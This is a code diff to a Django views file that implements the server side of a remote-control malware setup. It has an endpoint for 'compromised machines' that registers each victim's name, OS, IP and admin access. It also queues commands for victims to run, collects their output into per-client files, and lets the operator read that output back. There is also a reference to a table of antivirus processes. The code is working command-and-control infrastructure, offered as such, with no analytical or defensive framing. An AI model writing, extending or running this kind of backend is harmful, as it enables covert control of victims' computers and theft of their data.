@@ -3,6 +3,8 @@ from rest_framework.views import APIView
 from .serializers import ClientSerializer, CommandSerializer
 from .models import Client, Command
 from rest_framework.response import Response
+import os
+from django.conf import settings
 # Create your views here.
 
 ANTIVIRUS_PROCESSES = {
@@ -51,7 +53,7 @@ ANTIVIRUS_PROCESSES = {
 class ClientListView(APIView):
     serializer_class = ClientSerializer
     def get(self, request):
-        clients = Client.objects.all()
+        clients = Client.objects.all().order_by('-last_seen')
         serializer = self.serializer_class(clients, many=True)
         return Response(serializer.data, status=200)
 
@@ -129,7 +131,15 @@ class CompromisedMachine(APIView):
             ip = request.META.get('REMOTE_ADDR')
         return ip
 
-    def what_todo(self, request):
+
+    def get_command(self, id):
+        command = Command.objects.filter(client=str(id), status=False).first()
+        if command:
+            command.read=True
+            command.save()
+        return command
+    
+    def save_client_info(self, request):
         ip = self.get_client_ip(request)
         name =request.data.get('name', 'Unknown')
         os = request.data.get('os', 'Unknown')
@@ -146,7 +156,7 @@ class CompromisedMachine(APIView):
             client.access= admin
             client.save()        
         except Client.DoesNotExist:
-            Client.objects.create(
+            client= Client.objects.create(
                 pcname=name, 
                 ip=ip,
                 computer=os,
@@ -155,12 +165,81 @@ class CompromisedMachine(APIView):
                 access= admin,
                 status='active',
             )
+        
+        command = self.get_command(client.id)
+        return command
+    
+    def save_response(self, data):
+        commandid = data.get('id', None)
+        response = data.get('response', None)
+        try:
+            clientid = Command.objects.get(id= commandid).client
+            client = Client.objects.get(id= clientid)
+            root_dir = settings.BASE_DIR  
+            
+            target_dir = os.path.join(root_dir, f"ClientsData/{client.id}")
+
+            if not os.path.exists(target_dir):
+                os.makedirs(target_dir)
+
+            file_path = os.path.join(target_dir, f"{commandid}.txt")
+            with open(file_path, "a", encoding="utf-8") as file:
+                file.write(response)
+        except Exception as ex:
+            print(ex)
+            return None
+    
+    def save_status(self, data):
+        commandid = data.get('id', None)
+        result = data.get('result', None)
+        try:
+            command = Command.objects.get(id= commandid)
+            command.result=result
+            command.status=True
+            command.save()
+        except:
+            return None
+
+    def what_todo(self, request):
+        if 'response' in request.data:
+            self.save_response(request.data)
+        elif 'result' in request.data:
+            self.save_status(request.data)
+        else:
+            command = self.save_client_info(request)
+            if command:
+                return {
+                    'type':'command',
+                    'command': command.command,
+                    'commandid':str(command.id),
+                }
+            else:
+                return {
+                    'type':'no-command'
+                }
+            
     
     def get(self, request):
-        # Placeholder for compromised machine logic
-        self.what_todo(request)
-        return Response({"message": "Compromised machine endpoint"}, status=200)
+        response = self.what_todo(request)
+        return Response(response, status=200)
 
     def post(self, request):
-        # Placeholder for handling compromised machine data
-        return Response({"message": "Compromised machine data received"}, status=201)
+        return Response({"message": "Compromised machine data received"}, status=200)
+
+class CommandResponse(APIView):
+
+    def get(self, request, id):
+        try:
+            command = Command.objects.get(id=id)
+            clientid = command.client
+            root_dir = settings.BASE_DIR  
+            target_dir = os.path.join(root_dir, f"ClientsData/{clientid}")
+
+            file_path = os.path.join(target_dir, f"{command.id}.txt")
+            with open(file_path, "r", encoding="utf-8") as file:
+                data = file.read()
+
+            return Response({'data':data, 'title':id+ " : " +command.result}, status=200)
+
+        except Exception as ex:
+            return Response({'data':f'No Data Found'}, status=404)
